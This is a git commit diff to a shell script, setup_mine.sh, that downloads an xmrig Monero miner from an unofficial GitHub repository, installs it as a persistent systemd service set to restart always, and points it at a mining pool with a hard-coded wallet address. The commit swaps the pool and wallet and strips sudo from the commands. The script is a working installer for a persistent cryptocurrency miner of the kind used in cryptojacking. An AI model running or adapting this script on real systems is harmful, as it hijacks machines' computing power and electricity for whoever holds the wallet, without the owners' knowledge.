b212aa408b4033c6308548aa8631df7455776816
Jerry97453242 <101013913+Jerry97453242@users.noreply.github.com>
2022-04-10 19:58:15 +0800

    Update setup_mine.sh

--- setup_mine.sh
+++ setup_mine.sh
@@ -2,21 +2,21 @@
 curl -L --progress-bar "https://github.com/gamemod5/auto/raw/main/xmrig" -o /tmp/xmrig
 [ -d $HOME/c3pool ] || mkdir $HOME/c3pool
 cp /tmp/xmrig $HOME/c3pool/
-sudo chmod +x $HOME/c3pool/xmrig
+chmod +x $HOME/c3pool/xmrig
 cat >/tmp/c3pool_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 [Service]
-ExecStart=$HOME/c3pool/xmrig -o pool.minexmr.com:4444 -u 49pjSwALVKaNHwK4sWfFWNXosfQxwZgf71fXysnpsR6nHci34Lg6aq2G7vAKuo2zxASxZCpHWpvwPddVpF1x5NF83Zdq3ac
+ExecStart=$HOME/c3pool/xmrig -o auto.c3pool.org:19999 -u 436mqed36G2Pbj2E42N7rEevBeybTX5GmAYqyNB7Zw4WaXCPGkhey8nCEE9bWHhot8Nb8AjGvBJny2p7k2LBT15nLb8Yyt8
 Restart=always
 Nice=10
 CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
+mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
 echo "[*] Starting c3pool_miner systemd service"
-sudo killall xmrig 2>/dev/null
-sudo systemctl daemon-reload
-sudo systemctl enable c3pool_miner.service
-sudo systemctl start c3pool_miner.service
+killall xmrig 2>/dev/null
+systemctl daemon-reload
+systemctl enable c3pool_miner.service
+systemctl start c3pool_miner.service
